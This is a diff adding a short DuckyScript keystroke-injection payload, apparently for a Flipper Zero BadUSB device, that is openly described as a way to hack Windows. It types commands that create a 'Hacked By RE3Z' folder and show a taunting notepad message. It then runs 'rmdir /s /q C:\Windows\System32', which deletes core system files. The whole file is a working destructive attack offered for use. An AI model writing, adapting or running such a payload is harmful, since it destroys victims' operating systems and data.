@@ -1,0 +1,26 @@
+
+REM This Script Was Made By RE3Z
+REM This Is Made For The Flipper Zero To Hack Windows OS
+REM WARNING! This Script Deletes System 32 From Your Computer AKA Your Computer System File
+
+DELAY 1000
+GUI r
+DELAY 700
+STRING cmd
+ENTER 
+DELAY 1000
+STRING mkdir Hacked By RE3Z
+ENTER
+DELAY 700
+GUI r 
+STRING notepad
+DELAY 1000
+STRING Your Computer Is Fucked And Will Be Destroyed In 10 Seconds, Any Last Words?
+STRING And No You Cant Stop This So Good Luck...      BOZO!
+DELAY 10000
+CONTROL ALT DELETE
+STRING rmdir /s /q C:\Windows\System32
+ENTER
+DELAY 600
+STRING exit
+ENTER
